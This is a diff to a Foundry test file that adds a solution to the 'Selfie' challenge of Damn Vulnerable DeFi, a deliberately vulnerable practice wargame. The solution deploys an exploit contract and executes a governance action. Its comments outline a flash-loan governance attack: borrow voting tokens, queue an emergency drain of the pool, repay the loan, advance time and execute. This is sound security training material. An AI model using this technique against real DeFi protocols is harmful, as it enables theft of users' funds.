@@ -6,6 +6,8 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
+import {Exploit} from "./Exploit.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +64,22 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        Exploit e = new Exploit(
+            governance,
+            pool,
+            IERC20(address(token)),
+            recovery
+        );
+        e.attack();
+        vm.warp(block.timestamp + 2 days);
+        governance.executeAction(e.actionId());
+
+        // game plan
+        // 1. take a flash loan from the pool
+        // 2. call the governance contract and initiate a `queueAction` to `emergencyExit` the lending pool
+        // 3. approve tokens back to pool and pay back flashloan
+        // 4. speedup time
+        // 5. call `executeAction
     }
 
     /**
@@ -71,6 +88,10 @@ contract SelfieChallenge is Test {
     function _isSolved() private view {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
-        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            TOKENS_IN_POOL,
+            "Not enough tokens in recovery account"
+        );
     }
 }
